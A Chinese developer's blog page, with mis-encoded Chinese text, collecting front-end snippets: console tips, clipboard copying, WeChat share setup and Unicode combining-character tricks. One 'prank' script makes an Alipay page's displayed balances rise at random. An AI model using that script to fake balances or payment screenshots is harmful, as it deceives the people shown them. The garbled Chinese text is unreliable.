<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">
<script>
    (function () {
        if ('') {
            if (prompt('è¯·è¾“å…¥æ–‡ç« å¯†ç ') !== '') {
                alert('å¯†ç é”™è¯¯ï¼');
                if (history.length === 1) {
                    location.replace("https://google.com"); // è¿™é‡Œæ›¿æ¢æˆä½ çš„é¦–é¡µ
                } else {
                    history.back();
                }
            }
        }
    })();
</script>








<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta property="og:type" content="website">
<meta property="og:title" content="è‹ç”Ÿä¸æƒ‘çš„åšå®¢">
<meta property="og:url" content="http://yoursite.com/page/22/index.html">
<meta property="og:site_name" content="è‹ç”Ÿä¸æƒ‘çš„åšå®¢">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="è‹ç”Ÿä¸æƒ‘çš„åšå®¢">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'åšä¸»'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/22/">



<meta name="referrer" content="never"> â€‹â€‹â€‹â€‹


  <title>è‹ç”Ÿä¸æƒ‘çš„åšå®¢</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">è‹ç”Ÿä¸æƒ‘çš„åšå®¢</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            é¦–é¡µ
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            å…³äº
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            å½’æ¡£
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            æœç´¢
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="æœç´¢..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/21/å‰ç«¯ä»£ç æ”¶é›†/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="è‹ç”Ÿä¸æƒ‘">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="è‹ç”Ÿä¸æƒ‘çš„åšå®¢">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/05/21/å‰ç«¯ä»£ç æ”¶é›†/" itemprop="url">å‰ç«¯ä»£ç æ”¶é›†</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-05-21T19:17:58+08:00">
                2019-05-21
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  4.6k å­—
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  22 åˆ†é’Ÿ
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="ç¼–è¾‘ç½‘é¡µ"><a href="#ç¼–è¾‘ç½‘é¡µ" class="headerlink" title="ç¼–è¾‘ç½‘é¡µ"></a>ç¼–è¾‘ç½‘é¡µ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.designMode = <span class="string">"on"</span></span><br></pre></td></tr></table></figure>
<h3 id="Consoleä¸­çš„æŠ€å·§"><a href="#Consoleä¸­çš„æŠ€å·§" class="headerlink" title="Consoleä¸­çš„æŠ€å·§"></a>Consoleä¸­çš„æŠ€å·§</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chromeä¼šå¸®ä½ buffer <span class="number">5</span>ä¸ªä½ æŸ¥çœ‹è¿‡çš„DOMå¯¹è±¡ï¼Œä½ å¯ä»¥ç›´æ¥åœ¨Consoleä¸­ç”¨ $<span class="number">0</span>, $<span class="number">1</span>, $<span class="number">2</span>, $<span class="number">3</span>, $<span class="number">4</span>æ¥è®¿é—®ã€‚</span><br><span class="line">ä½ è¿˜å¯ä»¥ä½¿ç”¨åƒjQueryé‚£æ ·çš„è¯­æ³•æ¥è·å¾—DOMå¯¹è±¡ï¼Œå¦‚ï¼š$(<span class="string">"#mydiv"</span>)</span><br><span class="line">ä½ è¿˜å¯ä½¿ç”¨ $$(<span class="string">".class"</span>) æ¥é€‰æ‹©æ‰€æœ‰æ»¡è¶³æ¡ä»¶çš„DOMå¯¹è±¡ã€‚</span><br><span class="line">ä½ å¯ä»¥ä½¿ç”¨ getEventListeners($(<span class="string">"selector"</span>)) æ¥æŸ¥çœ‹æŸä¸ªDOMå¯¹è±¡ä¸Šçš„äº‹ä»¶</span><br><span class="line">è¿˜å¯ä»¥ä½¿ç”¨ monitorEvents($(<span class="string">"selector"</span>)) æ¥ç›‘æ§ç›¸å…³çš„äº‹ä»¶</span><br></pre></td></tr></table></figure>
<h3 id="å°†å†…å®¹å¤åˆ¶åˆ°å‰ªè´´æ¿"><a href="#å°†å†…å®¹å¤åˆ¶åˆ°å‰ªè´´æ¿" class="headerlink" title="å°†å†…å®¹å¤åˆ¶åˆ°å‰ªè´´æ¿"></a>å°†å†…å®¹å¤åˆ¶åˆ°å‰ªè´´æ¿</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;input id=<span class="string">"demoInput"</span> value=<span class="string">"hello world"</span>&gt;</span><br><span class="line">&lt;button id=<span class="string">"btn"</span>&gt;ç‚¹æˆ‘å¤åˆ¶&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">const btn = document.querySelector('#btn')</span></span><br><span class="line"><span class="regexp">btn.addEventListener('click', () =&gt; &#123;</span></span><br><span class="line"><span class="regexp">  const input = document.querySelector('#demoInput')</span></span><br><span class="line"><span class="regexp">  input.select()</span></span><br><span class="line"><span class="regexp">  if (document.execCommand('copy')) &#123;</span></span><br><span class="line"><span class="regexp">    console.log('å¤åˆ¶æˆåŠŸ')</span></span><br><span class="line"><span class="regexp">  &#125; else &#123;</span></span><br><span class="line"><span class="regexp">    console.log('å¤åˆ¶å¤±è´¥')</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;)</span></span><br><span class="line"><span class="regexp">const btn = document.querySelector('#btn')</span></span><br><span class="line"><span class="regexp">btn.addEventListener('click', () =&gt; &#123;</span></span><br><span class="line"><span class="regexp">  const input = document.createElement('input')</span></span><br><span class="line"><span class="regexp">  document.body.appendChild(input)</span></span><br><span class="line"><span class="regexp">  input.setAttribute('value', 'å¤åˆ¶æˆ‘')</span></span><br><span class="line"><span class="regexp">  input.select()</span></span><br><span class="line"><span class="regexp">  if (document.execCommand('copy')) &#123;</span></span><br><span class="line"><span class="regexp">    console.log('å¤åˆ¶æˆåŠŸ')</span></span><br><span class="line"><span class="regexp">  &#125; else &#123;</span></span><br><span class="line"><span class="regexp">    console.log('å¤åˆ¶å¤±è´¥')</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">  document.body.removeChild(input)</span></span><br><span class="line"><span class="regexp">&#125;)</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">https:/</span><span class="regexp">/blog.mutoe.com/</span><span class="number">2019</span>/copy-content-to-clipboard-<span class="keyword">in</span>-javascript/</span><br></pre></td></tr></table></figure>
<h3 id="å¾®ä¿¡åˆ†äº«"><a href="#å¾®ä¿¡åˆ†äº«" class="headerlink" title="å¾®ä¿¡åˆ†äº«"></a>å¾®ä¿¡åˆ†äº«</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shareLinkUlr = location.href.split(<span class="string">"#"</span>)[<span class="number">0</span>]; <span class="comment">// è·å–å½“å‰çš„url å»æ‰ # ä¹‹åçš„éƒ¨åˆ†</span></span><br><span class="line">shareLinkUlr = shareLinkUlr.replace(<span class="regexp">/\&amp;/g</span>, <span class="string">'%26'</span>); <span class="comment">// å°† &amp; æ›¿æ¢æˆ %26</span></span><br><span class="line"><span class="keyword">var</span> shareImgUrl = <span class="string">'http://www.abc.com/images/logo300.jpg'</span>; <span class="comment">// åˆ†äº«çš„å›¾ç‰‡åœ°å€</span></span><br><span class="line"><span class="comment">// è·å– config çš„å†…å®¹</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getjssdkconfig</span>(<span class="params">apis,debug,json,link</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//console.log(apis);</span></span><br><span class="line">    <span class="comment">//console.log(debug);</span></span><br><span class="line">    <span class="comment">//console.log(json);</span></span><br><span class="line">    <span class="comment">//console.log(link);</span></span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    <span class="keyword">var</span> url = <span class="string">'http://www.abc.com/qxj_jssdkconfig'</span>; <span class="comment">// è¿™ä¸ªå°±æ˜¯easywechatç”Ÿæˆçš„å‚æ•°</span></span><br><span class="line">    <span class="keyword">var</span> data = <span class="string">"apis="</span>+apis+<span class="string">"&amp;debug="</span>+debug+<span class="string">"&amp;json="</span>+json+<span class="string">"&amp;url="</span>+link; <span class="comment">// æ‹¼æ¥ get å‚æ•°</span></span><br><span class="line">    xhr.open(<span class="string">'GET'</span>,url+<span class="string">"?"</span>+data);</span><br><span class="line">    xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(xhr.readyState===<span class="number">4</span> &amp;&amp; (xhr.status &gt;=<span class="number">200</span> &amp;&amp; xhr.status &lt;=<span class="number">300</span>))&#123;</span><br><span class="line">            <span class="comment">// è·å– config ä¹‹åï¼Œè¿›è¡Œä¸€äº›æ“ä½œ</span></span><br><span class="line">            <span class="comment">// éœ€è¦è¿›è¡Œ JSON.parse è·å–å¯¹è±¡</span></span><br><span class="line">            configJsSDKAndDoSomething(<span class="built_in">JSON</span>.parse(xhr.responseText));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    xhr.send();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è·å–config ä¹‹åè¿›è¡Œçš„æ“ä½œ</span></span><br><span class="line"><span class="comment">// å› ä¸ºæ˜¯ä½¿ç”¨ ajax è¿›è¡Œconfigå†…å®¹ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯åœ¨ä¸Šé¢è¿è¡Œçš„</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">configJsSDKAndDoSomething</span>(<span class="params">config</span>)</span>&#123;</span><br><span class="line">    wx.config(config);</span><br><span class="line">    wx.ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// å…¶ä»–çš„ä¸€äº›æ“ä½œ</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä¸æ˜¯wifiç¯å¢ƒä¸‹æç¤º</span></span><br><span class="line">        wx.getNetworkType(&#123;</span><br><span class="line">            success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">var</span> networkType = res.networkType; <span class="comment">// è¿”å›ç½‘ç»œç±»å‹2gï¼Œ3gï¼Œ4gï¼Œwifi</span></span><br><span class="line">                <span class="keyword">if</span>(networkType!=<span class="string">"wifi"</span>)&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">"å½“å‰ä½ ç½‘ç»œç¯å¢ƒä¸º"</span>+networkType+<span class="string">""</span>);                    </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    wx.error(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(error);</span><br><span class="line">    &#125;);</span><br><span class="line">    wx.onMenuShareTimeline(&#123;</span><br><span class="line">        title: <span class="string">''</span>, <span class="comment">// åˆ†äº«æ ‡é¢˜</span></span><br><span class="line">        link: location.href, <span class="comment">// åˆ†äº«é“¾æ¥ï¼Œè¯¥é“¾æ¥åŸŸåæˆ–è·¯å¾„å¿…é¡»ä¸å½“å‰é¡µé¢å¯¹åº”çš„å…¬ä¼—å·JSå®‰å…¨åŸŸåä¸€è‡´</span></span><br><span class="line">        imgUrl:shareImgUrl, <span class="comment">// åˆ†äº«å›¾æ ‡</span></span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            alert(<span class="string">'åˆ†äº«æˆåŠŸ'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    wx.onMenuShareAppMessage(&#123;</span><br><span class="line">        title: <span class="string">''</span>, <span class="comment">// åˆ†äº«æ ‡é¢˜</span></span><br><span class="line">        desc: <span class="string">''</span>, <span class="comment">// åˆ†äº«æè¿°</span></span><br><span class="line">        link: location.href, <span class="comment">// åˆ†äº«é“¾æ¥ï¼Œè¯¥é“¾æ¥åŸŸåæˆ–è·¯å¾„å¿…é¡»ä¸å½“å‰é¡µé¢å¯¹åº”çš„å…¬ä¼—å·JSå®‰å…¨åŸŸåä¸€è‡´</span></span><br><span class="line">        imgUrl: shareImgUrl, <span class="comment">// åˆ†äº«å›¾æ ‡</span></span><br><span class="line">        type: <span class="string">'link'</span>, <span class="comment">// åˆ†äº«ç±»å‹,musicã€videoæˆ–linkï¼Œä¸å¡«é»˜è®¤ä¸ºlink</span></span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;,</span><br><span class="line">        cancel: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// é¡µé¢åŠ è½½å®Œä¹‹åè¿›è¡Œæ“ä½œ</span></span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// æ³¨æ„è¿™é‡Œçš„å‚æ•°</span></span><br><span class="line">    <span class="comment">// apis ä½¿ç”¨çš„å‚æ•°æ˜¯ å­—ç¬¦ä¸²çš„æ‹¼æ¥ è¿™ä¸ªæ˜¯å’Œ php çš„æ–¹æ³•ä¸­çš„å¤„ç†ç›¸å¯¹åº”çš„</span></span><br><span class="line">    getjssdkconfig(<span class="string">"checkJsApi,onMenuShareTimeline,onMenuShareAppMessage,onMenuShareQQ,onMenuShareWeibo,onMenuShareQZone,hideMenuItems,showMenuItems,hideAllNonBaseMenuItem,showAllNonBaseMenuItem,translateVoice,startRecord,stopRecord,onVoiceRecordEnd,playVoice,onVoicePlayEnd,pauseVoice,stopVoice,uploadVoice,downloadVoice,chooseImage,previewImage,uploadImage,downloadImage,getNetworkType,openLocation,getLocation,hideOptionMenu,showOptionMenu,closeWindow,scanQRCode,chooseWXPay,openProductSpecificView,addCard,chooseCard,openCard"</span>,<span class="literal">false</span>,<span class="literal">false</span>,shareLinkUlr);</span><br><span class="line">&#125;);</span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/30886</span></span><br></pre></td></tr></table></figure>
<h3 id="æ”¯ä»˜å®è½¬è´¦æ¶æ"><a href="#æ”¯ä»˜å®è½¬è´¦æ¶æ" class="headerlink" title="æ”¯ä»˜å®è½¬è´¦æ¶æ"></a>æ”¯ä»˜å®è½¬è´¦æ¶æ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">/** æ”¯ä»˜å®æ¶æ **/</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">inc</span>(<span class="params">el</span>) </span>&#123; <span class="comment">// æ›´æ–°é‡‘é¢æ•°å­—</span></span><br><span class="line">        el.innerHTML = el.innerHTML.replace(<span class="regexp">/\d+/</span>, <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> +a + rnd(<span class="number">9</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">rnd</span>(<span class="params">n</span>) </span>&#123; <span class="comment">// 1-n éšæœºæ•°https://www.cnblogs.com/52cik/p/js-alipay-jokes.html</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Math</span>.random() * n | <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">joke</span>(<span class="params">el</span>) </span>&#123; <span class="comment">// éšæœºå¢åŠ </span></span><br><span class="line">        inc(el);</span><br><span class="line">        setTimeout(joke, rnd(<span class="number">1e3</span>), el);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> amount = <span class="built_in">document</span>.getElementsByClassName(<span class="string">"amount"</span>);</span><br><span class="line"></span><br><span class="line">    joke(amount[<span class="number">0</span>]); <span class="comment">// è´¦æˆ·ä½™é¢ éšæœºå¢åŠ </span></span><br><span class="line">    joke(amount[<span class="number">1</span>]); <span class="comment">// ä½™é¢å® éšæœºå¢åŠ </span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<h3 id="å¥‡è‘©å­—ç¬¦ï¼ˆä¸å¯è§å­—ç¬¦ï¼‰"><a href="#å¥‡è‘©å­—ç¬¦ï¼ˆä¸å¯è§å­—ç¬¦ï¼‰" class="headerlink" title="å¥‡è‘©å­—ç¬¦ï¼ˆä¸å¯è§å­—ç¬¦ï¼‰"></a>å¥‡è‘©å­—ç¬¦ï¼ˆä¸å¯è§å­—ç¬¦ï¼‰</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> Ã© å­—ç¬¦ï¼Œä»–çš„ unicode æ˜¯ \u00e9, ä½†æ˜¯ä¹Ÿå¯ä»¥ç”¨ <span class="string">'e'</span> + <span class="string">'\u0301'</span> å®ç° <span class="string">"eÌ"</span> å‰è€… length æ˜¯ <span class="number">1</span>ï¼Œåè€… length æ˜¯ <span class="number">2</span>ã€‚</span><br><span class="line"><span class="string">'\u0301'</span> åœ¨è¿™é‡Œèµ·åˆ°äº†è¯­è°ƒç¬¦çš„ä½œç”¨ï¼Œç„¶åæˆ‘å°±ä¸§å¿ƒç—…ç‹‚çš„  <span class="string">'e'</span>+<span class="built_in">Array</span>(<span class="number">20</span>).join(<span class="string">'\u0301'</span>);  </span><br><span class="line"></span><br><span class="line"> <span class="string">'å‘µå‘µ'</span>+<span class="built_in">Array</span>(<span class="number">20</span>).join(<span class="string">'\u0310'</span>);  <span class="comment">// "å‘µå‘µÌÌÌÌÌÌÌÌÌÌÌÌÌÌÌÌÌÌÌ"</span></span><br><span class="line"> <span class="string">'å‘µå‘µ'</span>+<span class="built_in">Array</span>(<span class="number">20</span>).join(<span class="string">'\u031D'</span>);             <span class="comment">// "å‘µå‘µÌÌÌÌÌÌÌÌÌÌÌÌÌÌÌÌÌÌÌ"</span></span><br><span class="line"> <span class="string">'å‘µå‘µ'</span>+<span class="built_in">Array</span>(<span class="number">20</span>).join(<span class="string">'\u0E47'</span>);                          <span class="comment">// "å‘µå‘µà¹‡à¹‡à¹‡à¹‡à¹‡à¹‡à¹‡à¹‡à¹‡à¹‡à¹‡à¹‡à¹‡à¹‡à¹‡à¹‡à¹‡à¹‡à¹‡"</span></span><br><span class="line"> <span class="string">'å‘µå‘µ'</span>+<span class="built_in">Array</span>(<span class="number">20</span>).join(<span class="string">'\u0e49'</span>);                                       <span class="comment">// "å‘µå‘µà¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰"</span></span><br><span class="line"> <span class="string">'å‘µå‘µ'</span>+<span class="built_in">Array</span>(<span class="number">20</span>).join(<span class="string">'\u0598'</span>);        <span class="comment">// "å‘µå‘µÖ˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜"</span></span><br><span class="line"></span><br><span class="line">ä¹Ÿå¯ä»¥è¿™ä¹ˆç©...</span><br><span class="line"></span><br><span class="line"> <span class="string">'å‘µå‘µ'</span>+<span class="built_in">Array</span>(<span class="number">20</span>).join(<span class="string">'\u0310'</span>)+<span class="built_in">Array</span>(<span class="number">20</span>).join(<span class="string">'\u0598'</span>)+<span class="built_in">Array</span>(<span class="number">20</span>).join(<span class="string">'\u0e49'</span>);  <span class="comment">// "å‘µå‘µÌÌÌÌÌÌÌÌÌÌÌÌÌÌÌÌÌÌÌÖ˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜Ö˜à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰à¹‰"</span></span><br><span class="line">http:<span class="comment">//www.fileformat.info/info/unicode/category/Mn/list.htm  </span></span><br><span class="line">è¿™é‡Œè¯¦ç»†çš„åˆ—å‡ºäº†æ¯ä¸ªç¼–ç ä»¥åŠå¯¹åº”çš„æ„æ€ï¼Œè¿˜æœ‰å›¾ç‰‡å±•ç°ã€‚https:<span class="comment">//www.cnblogs.com/52cik/p/unicode-mark-nonspacing.html#!comments</span></span><br></pre></td></tr></table></figure>
